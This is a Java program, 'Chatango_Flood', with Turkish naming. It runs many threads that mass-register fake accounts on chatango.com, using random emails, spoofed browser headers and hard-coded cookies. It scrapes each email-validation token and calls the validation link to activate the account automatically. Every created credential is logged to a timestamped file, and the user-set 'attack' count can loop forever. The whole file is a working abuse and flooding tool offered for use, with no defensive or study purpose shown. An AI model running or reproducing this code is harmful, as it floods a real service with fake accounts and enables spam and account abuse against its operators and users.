import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

public class Chatango_Flood {
	static String Data = "";
	static int ThreadSayi = 0;
	static int SaldiriSayisi = 0;
	static List<String> Temp = new ArrayList<String>();

	public static void main(String[] args) {
		Scanner Scanner1 = new Scanner(System.in);
		try {
			Chatango_Flood chatango_Flood = new Chatango_Flood();
			DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
			// get current date time with Date()
			Date date = new Date();
			Data = dateFormat.format(date);
			chatango_Flood.YazKekeThread();
			System.out.print("Thread-Sayi:");
			int ThreadSayisi = Scanner1.nextInt();
			System.out.print("Saldiri-Sayi:");
			int SaldiriSayi = Scanner1.nextInt();
			ThreadSayi = ThreadSayisi;
			for (int i = 0; i < ThreadSayisi; i++) {
				chatango_Flood.Thread_isci((i + 1), SaldiriSayi);
			}
		} catch (Exception e) {

		}
	}

	public String random(int uzunluk) {
		String alfabe = "1234567890asdfghjklizxcvbnnmQWERTYUIOPASDFGHJKLZXCVBNM";
		char[] alfabecik = alfabe.toCharArray();
		StringBuffer kelime = new StringBuffer();
		Random rand = new Random();
		for (int x = 0; x < uzunluk; x++) {
			kelime.append(alfabecik[rand.nextInt(alfabecik.length - 1)]);
		}
		return kelime.toString();
	}

	public String UyeOl(String Eposta, String Parola, String KullaniciAdi) throws Exception {
		HttpURLConnection con = (HttpURLConnection) new URL("http://chatango.com/signuptag").openConnection();
		con.setRequestMethod("POST");
		con.setRequestProperty("User-Agent",
				"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0");
		con.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		con.setRequestProperty("Accept-Language", "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3");
		con.setRequestProperty("Accept-Encoding", "gzip, deflate");
		con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		con.setRequestProperty("Referer", "http://st.chatango.com/h5/gz/r0517161858/id.html");
		con.setRequestProperty("Origin", "http://st.chatango.com");
		con.setRequestProperty("Cookie",
				"cookies_enabled.chatango.com=yes; __gads=ID=a24b5ac8992d55d9:T=1463772568:S=ALNI_MYIR_Eu-hZcsaa3oFVLpegx85ClRA; _ga=GA1.2.616908173.1463772571");
		con.setDoOutput(true);
		String Postdata = "POST_DATA=group%5Ftitle=%20&group%5Furl=turkanime&checkerrors=yes&password%5Fconfirm="
				+ Parola + "&password=" + Parola + "&login=" + KullaniciAdi + "&email=" + Eposta;
		// POST_DATA=group%5Ftitle=%20&group%5Furl=turkanime&checkerrors=yes&password%5Fconfirm=qweqweqweqwe&password=qweqweqweqwe&login=%%%rasgele10%%%&email=%%%rasgele10%%%@%%%rasgele3%%%.com
		DataOutputStream buneaq = new DataOutputStream(con.getOutputStream());
		buneaq.writeBytes(Postdata);
		buneaq.flush();
		buneaq.close();
		int hatakodu = con.getResponseCode();
		System.out.println("Response-Code=>" + hatakodu);
		InputStreamReader veri = null;
		if (hatakodu == 200) {
			veri = new InputStreamReader(con.getInputStream());
		} else {
			veri = new InputStreamReader(con.getErrorStream());
		}
		BufferedReader reader = new BufferedReader(veri);
		StringBuffer Buffer = new StringBuffer();
		while (true) {
			String readline = reader.readLine();
			if (readline != null) {
				Buffer.append(readline);
			} else {
				reader.close();
				System.out.println("Serverden Gelen Cevap=> " + Buffer.toString());
				if (hatakodu != 200) {
					return "";
				}
				return Buffer.toString(); // email_validation_token=yekmeZBELMpPvg22vFvRGLYnHt4RweT1AMq99U0axrLMQ4c%3D&password
			}
		}
	}

	public int UyeDogrula(String DogrulamaKodu) throws Exception {
		HttpURLConnection con = (HttpURLConnection) new URL("https://chatango.com/evalidate?t=" + DogrulamaKodu)
				.openConnection();
		con.setRequestMethod("GET");
		con.setRequestProperty("User-Agent",
				"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0");
		con.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		con.setRequestProperty("Accept-Language", "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3");
		con.setRequestProperty("Accept-Encoding", "gzip, deflate");
		con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		con.setRequestProperty("Referer", "http://st.chatango.com/h5/gz/r0517161858/id.html");
		con.setRequestProperty("Origin", "http://st.chatango.com");
		con.setRequestProperty("Cookie",
				"cookies_enabled.chatango.com=yes; __gads=ID=a24b5ac8992d55d9:T=1463772568:S=ALNI_MYIR_Eu-hZcsaa3oFVLpegx85ClRA; _ga=GA1.2.616908173.1463772571");
		int response = con.getResponseCode();
		return response;
	}

	public void isci(String Eposta, String Parola, String Kullaniciadi) throws Exception {
		String Cevap = UyeOl(Eposta, Parola, Kullaniciadi);
		String[] Cevap2 = Cevap.split("email_validation_token=");
		String[] Cevap3 = Cevap2[1].split("&");
		int response = UyeDogrula(Cevap3[0]);
		if (response == 200) {
			YazKeke(Eposta, Parola, Kullaniciadi);
		}
	}

	public void Thread_isci(int No, int SaldiriSayi) {
		final int FNo = No;
		final int FSaldiriSayi = SaldiriSayi;
		System.out.println(No + " Nolu Thread Olusturuluyor...");
		Thread t = new Thread(new Runnable() {

			@Override
			public void run() {
				System.out.println(FNo + " Nolu Thread Baslatildi.");
				if (FSaldiriSayi == -1) {
					int i = 1;
					while (true) {
						try {
							String FEposta = random(10) + "@" + random(10) + "." + random(3);
							String FParola = random(15);
							String FKullaniciadi = random(10);
							isci(FEposta, FParola, FKullaniciadi);
							System.out.println(FNo + " Nolu Thread " + i + " Basarili islem Yapti");
							SaldiriEkle();
							i++;
							System.out.println(
									ThreadSayi + " Tane Thread ile Toplam " + SaldiriSayisi + " islem Yapildi.");
						} catch (Exception e) {

							System.out
									.println(FNo + " Nolu Thread Bir Hata ile Karþýlaþtý Fakat isleme Devam Ediyor...");
						}
					}
				} else {
					for (int i = 0; i < FSaldiriSayi; i++) {
						try {
							String FEposta = random(10) + "@" + random(10) + "." + random(3);
							/*String FParola = random(15);
							String FKullaniciadi = random(10);*/
							String FParola = "asdqwe123";
							String FKullaniciadi = "rezeronerde";
							isci(FEposta, FParola, FKullaniciadi);
							System.out.println(FNo + " Nolu Thread " + (i + 1) + " Kez Basarili islem Yapti");
							SaldiriEkle();
							System.out.println(
									ThreadSayi + " Tane Thread ile Toplam " + SaldiriSayisi + " islem Yapildi.");
						} catch (Exception e) {

							System.out
									.println(FNo + " Nolu Thread Bir Hata ile Karþýlaþtý Fakat isleme Devam Ediyor...");
						}
					}
				}

			}
		});
		t.start();
	}

	public void YazKeke(String Eposta, String Parola, String Kullaniciadi) {
		Temp.add(Eposta + ":" + Kullaniciadi + ":" + Parola);
	}

	public void SaldiriEkle() {
		SaldiriSayisi++;
	}

	public void YazKekeThread() {
		Thread Yazici = new Thread(new Runnable() {
			public void run() {
				try {
					boolean ilk = false;
					File Dosya = new File(Data + ".cikti");
					if (!Dosya.exists()) {
						Dosya.createNewFile();
						ilk = true;
					}
					BufferedWriter writer = new BufferedWriter(new FileWriter(Data + ".cikti", true));
					if (ilk) {
						writer.append("Eposta:Parola:Kullaniciadi");
					}
					while (true) {
						boolean girdi = false;
						for (String Dizi : new ArrayList<>(Temp)) {
							girdi = true;
							writer.newLine();
							writer.append(Dizi);
							String[] Temp1 = Dizi.split(":");
							Temp.remove(Temp.indexOf(Dizi));
							System.out.println("Eposta=>" + Temp1[0] + "&Kullanici=>" + Temp1[1] + "&Parola=>"
									+ Temp1[2] + " " + Data + ".cikti" + " Adli Dosyaya Kaydedildi !");
						}
						if(girdi){
						writer.flush();
						}
					}
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		});
		Yazici.start();

	}
}